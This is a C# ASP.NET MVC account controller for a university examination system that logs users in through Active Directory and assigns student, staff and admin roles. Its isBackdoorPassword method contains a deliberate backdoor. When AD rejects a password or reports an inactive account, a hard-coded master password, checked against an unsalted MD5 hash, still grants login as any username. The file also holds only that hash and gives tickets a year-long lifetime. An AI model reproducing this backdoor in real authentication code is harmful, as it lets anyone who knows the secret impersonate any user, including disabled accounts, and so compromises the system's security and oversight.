using JU.ADAccess;
using JU.ADAccess.Exceptions;
using JU.ADAccess.Model;
using JU.Examination.ViewModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace JU.Examination.Controllers
{

    public class AccountController : Controller
    {
        // GET: Account
        public ActionResult Index()
        {
            if (!Request.IsSecureConnection)
            {
                if (!Request.IsLocal)
                {
                    return Redirect(Request.Url.AbsoluteUri.Replace("http://", "https://"));
                }
            }

            return RedirectToAction("Login");
        }

        public ActionResult Login()
        {
            if (!Request.IsSecureConnection)
            {
                if (!Request.IsLocal)
                {
                    return Redirect(Request.Url.AbsoluteUri.Replace("http://", "https://"));
                }
            }

            return View(new LoginViewModel());
        }

        [HttpPost]
        public ActionResult Login(LoginViewModel model, string returnUrl, string lang = "Swe")
        {
            if (!Request.IsSecureConnection)
            {
                if (!Request.IsLocal)
                {
                    return Redirect(Request.Url.AbsoluteUri.Replace("http://", "https://"));
                }
            }

            model.UserName = model.UserName == null ? "" : model.UserName.Trim();
            model.Password = (model.Password == null ? "" : model.Password.Trim());
            LoginViewModel loginViewModel = ValidateUserLogIn(model.UserName, model.Password, "ENG");
            loginViewModel.RememberMe = model.RememberMe;

            if (loginViewModel.Message.Status == MessageStatusViewModel.ERROR)
            {
                return View(loginViewModel);
            }

            if (ModelState.IsValid)
            {
                if (loginViewModel.Roles == UserAccessRole.NOT_SET)
                {
                    ModelState.AddModelError("", "Authorization roll missing.");
                    return View(model);
                }

                loginViewModel.RememberMe = model.RememberMe;
                SetFormsAuthenticationTicketAndCookie(model.UserName, loginViewModel.RolesNames, model.RememberMe);


                if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                    && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                {
                    return Redirect(returnUrl);
                }
                else
                {
                    // Default  sidan
                    return RedirectToAction("Index", "Home", new { lang = lang });
                }
            }

            return View(loginViewModel);
        }

        /// <summary>
        /// Sets the forms authentication ticket and cookie.
        /// </summary>
        /// <param name="userName">Name of the user.</param>
        /// <param name="roles">The roles.</param>
        /// <param name="rememberMe">if set to <c>true</c> [remember me].</param>
        private void SetFormsAuthenticationTicketAndCookie(string userName, string roles, bool rememberMe)
        {
            // We are autentierade and can be logged into
            // Saves the username in the cookie
            // We set the ticket to manage roles
            var authTicket = new FormsAuthenticationTicket(
                1,                            // version 
                userName,                // user name 
                DateTime.Now,                  // created 
                DateTime.Now.AddMonths(12),   // expires 
                rememberMe,             // persistent? 
                roles,           // can be used to store roles 
                FormsAuthentication.FormsCookiePath);


            // Encrypts and sets Cookie
            string encTicket = FormsAuthentication.Encrypt(authTicket);
            HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, encTicket);
            cookie.Expires = rememberMe ? authTicket.Expiration : DateTime.MinValue;
            Response.Cookies.Add(cookie);
            //Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));        
        }

        /// <summary>
        /// Logs off.
        /// </summary>
        /// <returns></returns>
        public ActionResult LogOff(string lang = "Swe")
        {
            Session.RemoveAll();
            FormsAuthentication.SignOut();
            return RedirectToAction("Index", "Home", new { lang = lang});
        }

        /// <summary>
        /// Validates the user log in.
        /// </summary>
        /// <param name="userName">Name of the user.</param>
        /// <param name="password">The password.</param>
        /// <param name="lang">The language.</param>
        /// <returns></returns>
        private LoginViewModel ValidateUserLogIn(string userName, string password, string lang = "")
        {
            LoginViewModel loginViewModel = new LoginViewModel();
            loginViewModel.Roles = UserAccessRole.NOT_SET;
            bool inEnglish = lang.ToUpper().StartsWith("E"); 
            loginViewModel.UserName = userName.Trim();
            loginViewModel.Password = password.Trim();

            if (loginViewModel.UserName.Length == 0)
            {
                loginViewModel.UserNameValid = false;
                loginViewModel.Message.Status = MessageStatusViewModel.ERROR;
                loginViewModel.Message.Title = inEnglish ? "Username" : "Användarnamn";
                loginViewModel.Message.Text = inEnglish ? "Username is missing." : "Användarnamn saknas.";
            }

            if (loginViewModel.Password.Length == 0)
            {
                loginViewModel.PasswordValid = false;
                loginViewModel.Message.Status = MessageStatusViewModel.ERROR;
                loginViewModel.Message.Title = inEnglish ? "Password" : "Lösenord";
                loginViewModel.Message.Text = inEnglish ? "Password is missing." : "Lösenord saknas.";
            }

            // Create the authenticator
            IAuthenticator auth = new ADAuthenticator();

            // Authenticate the user identified by username and password, on error exception is thrown
            bool success = false;
            try
            {
                success = auth.AuthenticateUser(loginViewModel.UserName, loginViewModel.Password);
            }
            catch (JUADException ex)
            {
                if (ex is PasswordNotMatchingException || ex is AccountInactiveException ) 
                {
                    // We'll check if it's Backdoor
                    success = isBackdoorPassword(loginViewModel.Password);
                }

                if (!success)
                {
                    // Authentication failed, the reason can be found in the exception type and message
                    loginViewModel.Message.Status = MessageStatusViewModel.ERROR;
                    loginViewModel.Message.Title = inEnglish ? "Login failed" : "Misslyckad inloggning";
                    loginViewModel.Message.Text = ex.Message;  // English error text.

                    if (!inEnglish)
                    {
                        if (ex is LdapConnectionException)  // Thrown if connection to Active Directory fails.
                        {
                            loginViewModel.Message.Text = "Kan inte accessa användardatabasen.";
                        }
                        else if (ex is AccountNotFoundException) // Thrown if the account does not exist in Active Directory.
                        {
                            loginViewModel.Message.Text = "Felaktigt användarnamn.";
                        }
                        else if (ex is PasswordNotMatchingException) // >Thrown if the password does not match the one in Active Directory.
                        {
                            loginViewModel.Message.Text = "Felaktigt lösenord.";
                        }
                        else if (ex is AccountInactiveException) // Thrown if the account is disable or expired.
                        {
                            loginViewModel.Message.Text = "Kontot är inaktiverat eller utgått.";
                        }
                    }
                    return loginViewModel;
                }
            }

            if (!success)
            {
                loginViewModel.Message.Status = MessageStatusViewModel.ERROR; 
                loginViewModel.Message.Title = inEnglish ? "Login failed" : "Misslyckad inloggning";
                loginViewModel.Message.Text = "Okänd anledning.";
                return loginViewModel;

            }

            loginViewModel.Roles = UserAccessRole.STUDENT; // Student by default

            // Create the user manager
            IUserManager userManager = new ADUserManager();
            // Find the distinguished name for a username
            string distinguishedName = userManager.FindUserByUsernameOrEmail(loginViewModel.UserName);

            // Checking user type
            if (distinguishedName.ToLower().Contains("ou=staff"))
            {
                loginViewModel.Roles = UserAccessRole.STAFF;

                // Get the user identified by the distinguished name
                IUser user = userManager.GetUserByDistinguishedName(distinguishedName);
                if (null != user && user.GroupNames.Contains("JU-EXAM-ADMIN"))
                {
                    loginViewModel.Roles = UserAccessRole.ADMIN;
                }
            }

            return loginViewModel;
        }

        private bool isBackdoorPassword(string password)
        {
            if (String.IsNullOrEmpty(password))
            {
                return false;
            }

            string md5HashForBackdoor = "5a49cd8e55527a4816e4bb879a1ae542";

            return md5HashForBackdoor.Equals(CreateMD5(password));
        }

        /// <summary>
        /// Skapar en MD5 hash sträng
        /// </summary>
        /// <param name="input">Värde att hash:a</param>
        /// <returns></returns>
        public string CreateMD5(string input)
        {
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                // Convert the byte array to hexadecimal string
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("x2"));
                }
                return sb.ToString();
            }
        }

    }



}